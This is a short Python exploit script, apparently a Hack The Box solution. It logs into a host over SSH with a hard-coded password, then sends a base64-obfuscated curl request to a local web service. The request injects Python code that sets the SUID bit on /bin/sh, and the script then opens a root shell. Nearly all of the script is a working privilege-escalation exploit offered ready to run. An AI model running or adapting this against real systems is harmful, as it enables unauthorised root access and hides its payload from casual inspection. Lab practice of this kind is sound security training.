import os

try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] PC ~ Ninhpn\n")
except:
    print("\n[\033[1;31m!\033[1;37m] Need root or pwntools\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Exit...\n")
    sys.exit(1)
root = b64d('Y3VybCAtWCBQT1NUIDEyNy4wLjAuMTo4MDAwL2ZsYXNoL2FkZGNyeXB0ZWQyIC1kICdqaz1weWltcG9ydCUyMG9zO29zLnN5c3RlbSgiY2htb2QlMjB1JTJCcyUyMCUyRmJpbiUyRnNoIik7Zj1mdW5jdGlvbiUyMGYyKCkge307JnBhY2thZ2U9eHh4JmNyeXB0ZWQ9QUFBQSYmcGFzc3dvcmRzPWFhYWEn')



try:
	print("\n[\033[1;31m-\033[1;37m] Trying SSH user...\n")
	request = ssh(host='10.10.11.214', user='sau', password='HereIsYourPassWord1431')
	shell = request.process("/bin/sh")
	shell.sendline(root)
	time.sleep(0.3)
	shell.sendline(b"/bin/sh -p")
	shell.interactive()
except:
	print("\n[\033[1;31m-\033[1;37m] Exploit failed.. Maybe HTB updated the path\n")

